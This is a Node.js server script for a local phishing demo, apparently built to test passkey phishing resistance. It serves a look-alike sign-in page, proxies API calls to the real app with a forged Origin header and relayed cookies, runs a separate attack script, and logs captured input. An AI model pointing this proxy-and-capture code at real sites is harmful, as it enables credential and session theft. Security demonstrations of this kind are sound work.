#!/usr/bin/env node
// Phishing clone for the demo (docs/phishing-demo.md). Plain Node, no deps.
//   REAL_ORIGIN=http://localhost:3000 PHISH_PORT=3001 node server.mjs
// Serves a look-alike sign-in page with one button per attack, and proxies /api/* to the
// real app with the Origin header rewritten (an attacker's server can do that; a victim's
// browser can't). Deliberately on 127.0.0.1, NOT *.localhost, so it is a different site.
import { spawn } from "node:child_process";
import { readFile } from "node:fs/promises";
import http from "node:http";
import path from "node:path";
import { fileURLToPath } from "node:url";

const REAL_ORIGIN = process.env.REAL_ORIGIN ?? "http://localhost:3000";
const PHISH_PORT = Number(process.env.PHISH_PORT ?? 3001);
const HOST = "127.0.0.1";
const RP_ID = new URL(REAL_ORIGIN).hostname;
const dir = path.dirname(fileURLToPath(import.meta.url));

function send(res, status, body, type = "application/json") {
  res.writeHead(status, { "content-type": type, "cache-control": "no-store" });
  res.end(typeof body === "string" ? body : JSON.stringify(body));
}

async function readBody(req) {
  const chunks = [];
  for await (const c of req) chunks.push(c);
  return Buffer.concat(chunks);
}

async function proxy(req, res) {
  const body = ["GET", "HEAD"].includes(req.method) ? undefined : await readBody(req);
  const headers = { origin: REAL_ORIGIN };
  if (req.headers["content-type"]) headers["content-type"] = req.headers["content-type"];
  if (req.headers.cookie) headers.cookie = req.headers.cookie;
  try {
    const r = await fetch(REAL_ORIGIN + req.url, { method: req.method, headers, body });
    const out = { "content-type": r.headers.get("content-type") ?? "application/json" };
    const setCookie = r.headers.getSetCookie();
    if (setCookie.length) out["set-cookie"] = setCookie;
    res.writeHead(r.status, out);
    res.end(Buffer.from(await r.arrayBuffer()));
    console.log(`[proxy] ${req.method} ${req.url} → ${r.status}`);
  } catch (e) {
    send(res, 502, { error: { code: "PROXY", message: `Real site unreachable: ${e.message}` } });
  }
}

function runAttack3(res) {
  const child = spawn(process.execPath, [path.join(dir, "attack3.mjs")], {
    cwd: dir,
    env: { ...process.env, REAL_ORIGIN, PHISH_PORT: String(PHISH_PORT) },
  });
  let output = "";
  child.stdout.on("data", (d) => (output += d));
  child.stderr.on("data", (d) => (output += d));
  child.on("close", (code) => {
    console.log(`[attack3] exit ${code}`);
    send(res, 200, { exitCode: code, output });
  });
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${HOST}`);
  if (req.method === "GET" && ["/", "/signin"].includes(url.pathname)) {
    const html = (await readFile(path.join(dir, "index.html"), "utf8"))
      .replaceAll("__REAL_ORIGIN__", REAL_ORIGIN)
      .replaceAll("__RP_ID__", RP_ID);
    return send(res, 200, html, "text/html; charset=utf-8");
  }
  if (url.pathname.startsWith("/api/")) return proxy(req, res);
  if (req.method === "POST" && url.pathname === "/attack/3") return runAttack3(res);
  if (req.method === "POST" && url.pathname === "/attack/5") {
    const captured = JSON.parse((await readBody(req)).toString() || "{}");
    console.log("[attack5] captured", captured);
    return send(res, 200, { captured });
  }
  send(res, 404, { error: { code: "NOT_FOUND" } });
});

server.listen(PHISH_PORT, HOST, () => {
  console.log(`Phishing clone on http://${HOST}:${PHISH_PORT}  →  real site ${REAL_ORIGIN} (rpID ${RP_ID})`);
});
